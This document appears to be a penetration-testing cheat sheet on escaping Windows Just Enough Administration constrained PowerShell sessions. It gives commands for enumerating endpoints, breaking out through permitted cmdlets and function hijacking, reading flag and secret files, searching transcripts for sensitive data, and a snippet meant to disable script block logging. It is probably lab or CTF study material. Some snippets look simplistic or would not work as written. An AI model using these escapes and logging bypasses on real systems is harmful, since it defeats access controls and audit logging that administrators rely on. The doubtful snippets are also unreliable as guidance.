---
tags:
  - Active_Directory
  - Foundational
  - Windows
---

## Just Enough Administration Theory
resources: [Microsoft JEA Documentation](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview)

> [!info] **JEA** creates constrained PowerShell sessions with limited cmdlets. Users connect via PowerShell Remoting with restricted capabilities.

### JEA Components
> - **Role Capabilities (.psrc)** - Define allowed commands
> - **Session Configurations (.pssc)** - Define who can connect and which roles
> - **Virtual Accounts** - Sessions run as temporary admin accounts

### JEA Restrictions
> [!warning] JEA limitations to bypass:
> - Limited cmdlets available
> - No direct file system access
> - No arbitrary command execution
> - Transcription logging enabled

## Enumerating JEA

### Find JEA Endpoints [Remote]
```powershell
Get-PSSessionConfiguration | Where-Object { $_.RunAsVirtualAccount -eq $true }
```

### Connect to JEA Session [Remote]
```powershell
Enter-PSSession -ComputerName <Target> -ConfigurationName <JEAEndpoint>
```

### List Available Commands [Remote]
```powershell
Get-Command
```

### Check Session Capabilities [Remote]
```powershell
$ExecutionContext.SessionState.LanguageMode
Get-PSSessionCapability -ConfigurationName <JEAEndpoint> -Username <Domain>\<User>
```

## Breaking Out of JEA

### Command Injection via Parameters
> [!tip] Some commands may allow injection through parameters.

```powershell
# If command allows -ArgumentList or similar
Invoke-Expression "whoami"
```

### Abusing Allowed Cmdlets
> [!tip] Look for cmdlets that can execute code or access files.

```powershell
# If Start-Process is allowed
Start-Process cmd -ArgumentList "/c whoami"

# If Invoke-Command is allowed
Invoke-Command -ScriptBlock { whoami }
```

### File System Access via Allowed Cmdlets
```powershell
# If Get-Content is allowed
Get-Content C:\Users\Administrator\Desktop\flag.txt

# If Copy-Item is allowed
Copy-Item C:\secrets.txt C:\accessible\path\
```

### Function Hijacking
> [!tip] Define functions that override allowed cmdlets.

```powershell
function Get-Process {
    param($Name)
    & cmd.exe /c $Name
}
Get-Process whoami
```

### Transcript Analysis [Local]
> [!info] JEA logs transcripts. Check for sensitive information.

```powershell
Get-ChildItem "C:\Users\*\Documents\PowerShell\Transcripts" -Recurse
```

## JEA Configuration Review

### Find Role Capability Files [Remote]
```powershell
Get-ChildItem "C:\Program Files\WindowsPowerShell\Modules" -Recurse -Filter "*.psrc"
```

### Read Role Capabilities [Remote]
```powershell
Import-PowerShellDataFile "<Path>\RoleCapability.psrc"
```

### Session Configuration Files
```powershell
Get-ChildItem "C:\Windows\System32\WindowsPowerShell\v1.0\SessionConfig" -Filter "*.pssc"
```

## Exploitation via Misconfiguration

### Wildcard Function Definitions
> [!danger] If role allows `*` for **VisibleFunctions**, all functions available.

```powershell
# Check for overly permissive configurations
(Import-PowerShellDataFile .\role.psrc).VisibleFunctions
```

### Script Block Logging Bypass
```powershell
# Disable script block logging in session
$settings = [System.Management.Automation.PSInvocationSettings]::new()
$settings.LogPipelineExecutionDetails = $false
```
